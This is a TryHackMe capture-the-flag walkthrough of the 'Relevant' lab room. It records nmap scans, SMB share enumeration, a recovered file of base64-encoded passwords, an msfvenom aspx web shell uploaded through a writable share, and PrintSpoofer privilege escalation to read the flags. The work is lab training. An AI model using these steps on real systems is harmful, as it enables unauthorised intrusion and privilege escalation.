---
title: TryHackMe Relevant
date: 2021-08-04T08:35:47+05:30
lastmod: 2021-08-04T08:35:47+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Relevant

draft: false
description: TryHackMe Room Relevant solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Relevant|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg)|
| <b> Room [Subscription Required] </b>| [Relevant](https://tryhackme.com/room/relevant)|

## task 01: Pre-Engagement Briefing

### Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

* User.txt
* Root.txt

Additionally, the client has provided the following scope allowances:

* Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope
* Find and report ALL vulnerabilities (yes, there is more than one path to root)

---

## Let's start hacking

### recon

* Nmap Scan

     ```bash
     sudo nmap -sC -sV -oN nmap/init MACHINE_IP

     Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 08:44 IST
     Nmap scan report for MACHINE_IP
     Host is up (0.16s latency).
     Not shown: 995 filtered ports
     PORT     STATE SERVICE       VERSION
     80/tcp   open  http          Microsoft IIS httpd 10.0
     | http-methods: 
     |_  Potentially risky methods: TRACE
     |_http-server-header: Microsoft-IIS/10.0
     |_http-title: IIS Windows Server
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
     3389/tcp open  ms-wbt-server Microsoft Terminal Services
     | rdp-ntlm-info: 
     |   Target_Name: RELEVANT
     |   NetBIOS_Domain_Name: RELEVANT
     |   NetBIOS_Computer_Name: RELEVANT
     |   DNS_Domain_Name: Relevant
     |   DNS_Computer_Name: Relevant
     |   Product_Version: 10.0.14393
     |_  System_Time: 2021-08-04T03:14:36+00:00
     | ssl-cert: Subject: commonName=Relevant
     | Not valid before: 2021-08-03T03:12:35
     |_Not valid after:  2022-02-02T03:12:35
     |_ssl-date: 2021-08-04T03:15:16+00:00; +1s from scanner time.
     Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
     | smb-os-discovery: 
     |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
     |   Computer name: Relevant
     |   NetBIOS computer name: RELEVANT\x00
     |   Workgroup: WORKGROUP\x00
     |_  System time: 2021-08-03T20:14:40-07:00
     | smb-security-mode: 
     |   account_used: guest
     |   authentication_level: user
     |   challenge_response: supported
     |_  message_signing: disabled (dangerous, but default)
     | smb2-security-mode: 
     |   2.02: 
     |_    Message signing enabled but not required
     | smb2-time: 
     |   date: 2021-08-04T03:14:39
     |_  start_date: 2021-08-04T03:12:54

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 63.93 seconds
     ```

### Intesting Ports

* 80  : HTTP
* 445 : SMB

* all port scan just to be safe:

     ```zsh
     sudo nmap -p-  -oN nmap/all-ports MACHINE_IP

     PORT      STATE SERVICE
     80/tcp    open  http
     135/tcp   open  msrpc
     139/tcp   open  netbios-ssn
     445/tcp   open  microsoft-ds
     3389/tcp  open  ms-wbt-server
     49663/tcp open  unknown
     49667/tcp open  unknown
     49669/tcp open  unknown
     ```

* nmap scan on: `49663,49667,49669`

     ```zsh
     sudo nmap -sC -sV -oN nmap/custom-port MACHINE_IP -p 49663,49667,49669
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 09:03 IST
     Nmap scan report for MACHINE_IP
     Host is up (0.18s latency).

     PORT      STATE SERVICE VERSION
     49663/tcp open  http    Microsoft IIS httpd 10.0
     | http-methods: 
     |_  Potentially risky methods: TRACE
     |_http-server-header: Microsoft-IIS/10.0
     |_http-title: IIS Windows Server
     49667/tcp open  msrpc   Microsoft Windows RPC
     49669/tcp open  msrpc   Microsoft Windows RPC
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:window
     ```

### HTTP Recon

* port `80`

     ![img](https://i.imgur.com/GRALNo6.png)

* port `49663`

     ![img](https://i.imgur.com/6aanbrA.png)

> both returns default `IIS` webpage. `gobuster` time!!!

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

### SMB enumeration

* smbclient

     ```bash
     smbclient -L 10.10.107.20                                               
     Enter WORKGROUP\anir0y's password: 

          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          nt4wrksv        Disk      
     SMB1 disabled -- no workgroup available
     ```

* list `nt4wrksv` and download the file.

     ```bash
     smbclient  \\\\10.10.107.20\\nt4wrksv                                      
     Enter WORKGROUP\anir0y's password: 
     Try "help" to get a list of possible commands.
     smb: \> dir
     .                                   D        0  Sun Jul 26 03:16:04 2020
     ..                                  D        0  Sun Jul 26 03:16:04 2020
     passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

                    7735807 blocks of size 4096. 4946971 blocks available
     smb: \> get passwords.txt
     getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
     smb: \> 

     ```

* read the file

     ```cat
     cat passwords.txt                                                         
     [User Passwords - Encoded]
     Qm9iIC0gIVBAJCRXMHJEITEyMw==
     QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
     ```

* received 2 creds, let's save them and try with `psexec`

  - bob

       ![img](https://i.imgur.com/tGmFpkm.png)

  - bill

       ![img](https://i.imgur.com/whKfM5G.png)

* `psexec` didnot worked out, let's see if we can access the `smb` share directory `nt4wrksv` via web-servers!

     ![img](https://i.imgur.com/tj8hc9V.png)

we can read the content of `smb` share via web-server running on `49663` port.

## exploit SMB

* upload a `aspx` shell via `smb` share and gain access. once access is graanted, I'll be using `metasploit`  ! you can use `nc` or any other payload to continue.

* file generated with `msfvenom`
  
  ![img](https://i.imgur.com/MeQD1gW.png)

* uploaded via `SMBclient`
  
  ![img](https://i.imgur.com/coX0sMg.png)

* now we have shell, we can read `user.txt`

     ![img](https://i.imgur.com/9gQu9s0.png)

## Priv Esc

* `whoami /priv` reveals intresting thing
  
  ![img](https://i.imgur.com/lxqjoPN.png)

* I'll be using PrintSpoofer exploit : [GitHub](https://github.com/itm4n/PrintSpoofer)

* upload the file:

     ```bash
     smbclient  \\\\10.10.107.20\\nt4wrksv
     Enter WORKGROUP\anir0y's password: [blank]

     smb: \> put PrintSpoofer64.exe
     putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (42.9 kb/s) (average 422.0 kb/s)
     ```

* execute via msf-shell

     ![img](https://i.imgur.com/h6qrVGk.png)


* read the flag
  
     ![img](https://i.imgur.com/YSmsyah.png)

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
